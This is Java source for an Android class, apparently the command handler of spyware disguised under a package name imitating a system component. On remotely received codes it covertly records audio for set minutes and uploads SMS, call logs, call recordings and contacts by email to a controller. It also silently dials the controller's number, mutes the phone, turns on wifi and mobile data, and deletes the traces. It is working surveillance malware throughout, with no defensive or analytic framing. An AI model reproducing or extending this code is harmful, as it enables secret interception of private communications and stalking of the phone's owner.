package com.android.system.controled.logic;

import java.io.File;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.PriorityBlockingQueue;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Process;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.bean.Command;
import com.android.system.controled.db.InnerDbOpera;
import com.android.system.controled.util.AudioUtil;
import com.android.system.controled.util.FileUtil;
import com.android.system.controled.util.NetworkUtil;
import com.android.system.controled.util.RecorderUtil;
import com.android.system.controled.util.SendEmailUtil;
import com.android.system.controled.util.SmsSaveOutUtil;
import com.android.system.controled.util.TimeUtil;

public class CodeDoing implements Runnable {

	private static final String TAG = "CodeDoing";

	private BlockingQueue<Command> mCommands = new PriorityBlockingQueue<Command>();
	private final Thread mThread;
	private static CodeDoing mInstance;

	private CodeDoing() {
		mThread = new Thread(this);
		mThread.setName("MessageController");
		mThread.start();
	}

	public static CodeDoing getInstance() {
		if (mInstance == null) {
			mInstance = new CodeDoing();
		}

		return mInstance;
	}

	private void putCommand(Code code, Runnable runnable) {
		Command command = new Command();
		command.code = code;
		command.runnable = runnable;
		Debug.e(TAG, "新增命令：" + code.getCode());
		int retries = 3;
		Exception e = null;
		while (retries-- > 0) {
			try {
				if (mCommands.contains(command)) {
					Debug.e(TAG, "正在执行的命令重复！");
					
					Code code2 = new Code();
					code2.setDate(command.code.getDate());
					code2.setResult(Code.RESULT_CODE_REPEAT);
					InnerDbOpera.getInstence().updateCodeResult(code2);
					return;
				}
				mCommands.put(command);
				return;
			} catch (InterruptedException ie) {
				try {
					Thread.sleep(200);
				} catch (InterruptedException ne) {
				}
				e = ie;
			}
		}
		throw new Error(e);
	}

	@Override
	public void run() {
		Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
		while (true) {
			String commandDescription = null;
			Command command = mCommands.peek();
			try {
				if (command == null) {
					command = mCommands.take();
				}
				if (command != null) {
					commandDescription = command.code.getCode();
					Debug.e(TAG, "执行：" + commandDescription);
					command.runnable.run();
				}
			} catch (Exception e) {
				Debug.e(TAG, "Error running command '" + commandDescription);
				e.printStackTrace();
			} finally {
				if (command != null) {
					mCommands.remove(command);
				}
			}
		}

	}

	/**
	 * 执行命令
	 * 
	 * @Description:
	 * @param context
	 * @param msgTxt
	 * @param code
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-10-15
	 */
	public Code doOperaByMessage(Context context, Code code) {

		final long codeDateTime = code.getDate();
		String codeStr = code.getCode();
		try {

			if (codeStr.contains(MainApplication.PHONE_CODE_UP)) {
				doTurnUp(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_CALL_ME)) {
				doCall(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL)) {
				doUploadSmsCallLog(code, codeDateTime, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
				doUploadCallAudios(code, codeDateTime, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
				doUploadOtherAudios(code, codeDateTime, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_ALL)) {
				doUploadAll(code, codeDateTime, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_RECORD_TIME)) {
				doRecorderN(context, code, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS)) {
				doUploadContacts(code, codeDateTime, codeStr);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_RECORD_START)) {
				doRecorderStart(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_RECORD_END)) {
				doRecorderEnd(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DOWN)) {
				doSlient(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DELETE_MSG_LOG)) {
				doDeleteSms(code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DELETE_CALL_LOG)) {
				doDeleteCallLog(code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_TURNON_WIFI)) {
				doTurnOnWifi(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_TURNON_MOBILE)) {
				doTurnOnGprs(context, code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL)) {
				doDeleteCallAudios(code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
				doDeleteOtherAudios(code);
			}

			else if (codeStr.contains(MainApplication.PHONE_CODE_DELETE_ALL_LOG)) {
				doDeleteAll(code);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return code;
	}

	private void doDeleteAll(Code code) {
		code.setCode(MainApplication.PHONE_CODE_DELETE_ALL_LOG);
		code.setMark(MainApplication.PHONE_CODE_DELETE_ALL_LOG_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "删除所有记录");

		if (MainApplication.FILE_DB_SMS.exists()) {
			SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
			so.deleteAllMsg();
		}
		if (MainApplication.FILE_CALL_LOG.exists()) {
			MainApplication.FILE_CALL_LOG.delete();
		}

		FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));
		FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));

		code.setResult(Code.RESULT_OK);
	}

	private void doDeleteOtherAudios(Code code) {
		code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER);
		code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_OTHER_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "删除其它录音记录");

		FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_OTHER));

		code.setResult(Code.RESULT_OK);
	}

	private void doDeleteCallAudios(Code code) {
		code.setCode(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL);
		code.setMark(MainApplication.PHONE_CODE_DELETE_AUDIOS_CALL_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "删除通话录音记录");

		FileUtil.delFileDir(new File(MainApplication.FILEPATH_AUDIOS_CALL));

		code.setResult(Code.RESULT_OK);
	}

	private void doTurnOnGprs(Context context, Code code) {
		code.setCode(MainApplication.PHONE_CODE_TURNON_MOBILE);
		code.setMark(MainApplication.PHONE_CODE_TURNON_MOBILE_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "开启mobile network");
		NetworkUtil.setMobileNetEnable(context);
		code.setResult(Code.RESULT_OK);
	}

	private void doTurnOnWifi(Context context, Code code) {
		code.setCode(MainApplication.PHONE_CODE_TURNON_WIFI);
		code.setMark(MainApplication.PHONE_CODE_TURNON_WIFI_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "开启wifi");
		NetworkUtil.turnOnWifi(context);
		code.setResult(Code.RESULT_OK);
	}

	private void doDeleteCallLog(Code code) {
		code.setCode(MainApplication.PHONE_CODE_DELETE_CALL_LOG);
		code.setMark(MainApplication.PHONE_CODE_DELETE_CALL_LOG_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "删除通话记录");
		if (MainApplication.FILE_CALL_LOG.exists()) {
			MainApplication.FILE_CALL_LOG.delete();
		}
		code.setResult(Code.RESULT_OK);
	}

	private void doDeleteSms(Code code) {
		code.setCode(MainApplication.PHONE_CODE_DELETE_MSG_LOG);
		code.setMark(MainApplication.PHONE_CODE_DELETE_MSG_LOG_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "删除短信记录");

		if (MainApplication.FILE_DB_SMS.exists()) {
			SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
			so.deleteAllMsg();
		}

		code.setResult(Code.RESULT_OK);
	}

	private void doSlient(Context context, Code code) {
		Debug.e(TAG, "静音，并取消震动");
		code.setCode(MainApplication.PHONE_CODE_DOWN);
		code.setMark(MainApplication.PHONE_CODE_DOWN_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		AudioUtil.turnDown(context);
		code.setResult(Code.RESULT_OK);
	}

	private void doRecorderEnd(Context context, Code code) {
		Debug.e(TAG, "结束录音");
		code.setCode(MainApplication.PHONE_CODE_RECORD_END);
		code.setMark(MainApplication.PHONE_CODE_RECORD_END_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		RecorderUtil.getInstence(context).stopRecorder();
		code.setResult(Code.RESULT_OK);
	}

	private void doRecorderStart(Context context, Code code) {
		code.setCode(MainApplication.PHONE_CODE_RECORD_START);
		code.setMark(MainApplication.PHONE_CODE_RECORD_START_MARK);
		code.setRedoNeed(Code.REDO_NOT);
		Debug.e(TAG, "开始录音");
		// 文件保存位置
		String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis());
		if (RecorderUtil.getInstence(context).startRecorder(fileName, -1)) {
			code.setResult(Code.RESULT_OK);
		}
	}

	private void doUploadContacts(Code code, final long codeDateTime, String codeStr) {
		code.setRedoNeed(Code.REDO_NEED);
		Debug.e(TAG, "开始上传联系人");
		final SendEmailUtil send3 = new SendEmailUtil();
		if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MOBILE_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send3.upLoadContact(true, codeDateTime);
				}
			});
		} else {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_CONTACTS);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_CONTACTS_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send3.upLoadContact(false, codeDateTime);
				}
			});
		}
	}

	private void doRecorderN(Context context, Code code, String codeStr) {
		String words = codeStr.substring(codeStr.indexOf(MainApplication.PHONE_CODE_RECORD_TIME), codeStr.length());
		String[] strs = words.split(":");
		if (strs.length == 2 && strs[1] != null) {

			code.setCode(MainApplication.PHONE_CODE_RECORD_TIME + strs[1]);
			code.setMark(MainApplication.PHONE_CODE_RECORD_TIME_MARK);
			code.setRedoNeed(Code.REDO_NOT);

			Debug.e(TAG, "录音N分钟: " + strs[1]);
			// 文件保存位置
			String fileName = MainApplication.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "-" + strs[1] + " minutes";
			if (RecorderUtil.getInstence(context).startRecorder(fileName, Integer.parseInt(strs[1]))) {
				code.setResult(Code.RESULT_OK);
			}

		}
	}

	private void doUploadAll(Code code, final long codeDateTime, String codeStr) {
		Debug.e(TAG, "上传所有");
		code.setRedoNeed(Code.REDO_NEED);
		final SendEmailUtil send2 = new SendEmailUtil();
		if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MOBILE_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadALL(true, codeDateTime);
				}
			});
		} else {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_ALL);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_ALL_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadALL(false, codeDateTime);
				}
			});
		}
	}

	private void doUploadOtherAudios(Code code, final long codeDateTime, String codeStr) {
		Debug.e(TAG, "上传其它录音");
		code.setRedoNeed(Code.REDO_NEED);
		final SendEmailUtil send2 = new SendEmailUtil();
		if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadOtherAudios(true, codeDateTime);
				}
			});

		} else {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_OTHER_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadOtherAudios(false, codeDateTime);
				}
			});
		}
	}

	private void doUploadCallAudios(Code code, final long codeDateTime, String codeStr) {
		Debug.e(TAG, "上传通话录音");
		code.setRedoNeed(Code.REDO_NEED);
		final SendEmailUtil send2 = new SendEmailUtil();
		if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadCallAudios(true, codeDateTime);
				}
			});

		} else {

			code.setCode(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_AUDIO_CALL_MARK);
			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadCallAudios(false, codeDateTime);
				}
			});

		}
	}

	private void doUploadSmsCallLog(Code code, final long codeDateTime, String codeStr) {
		code.setRedoNeed(Code.REDO_NEED);
		Debug.e(TAG, "上传短信通话记录");
		final SendEmailUtil send2 = new SendEmailUtil();
		if (codeStr.contains(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE_MARK);

			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadSmsCallLog(true, codeDateTime);
				}
			});

		} else {
			code.setCode(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL);
			code.setMark(MainApplication.PHONE_CODE_UPLOAD_SMS_CALL_MARK);
			putCommand(code, new Runnable() {

				@Override
				public void run() {
					send2.upLoadSmsCallLog(false, codeDateTime);
				}
			});

		}
	}

	private void doCall(Context context, Code code) {
		code.setCode(MainApplication.PHONE_CODE_CALL_ME);
		code.setMark(MainApplication.PHONE_CODE_CALL_ME_MARK);
		Debug.e(TAG, "拨打电话");
		Uri uri = Uri.parse("tel:" + MainApplication.getInstence().getControllerTel());
		Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
		it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(it);

		code.setResult(Code.RESULT_OK);
	}

	private void doTurnUp(Context context, Code code) {
		code.setCode(MainApplication.PHONE_CODE_UP);
		code.setMark(MainApplication.PHONE_CODE_UP_MARK);
		Debug.e(TAG, "调大铃声音量，并加震动");
		AudioUtil.turnUpMost(context);
		code.setResult(Code.RESULT_OK);
	}

}
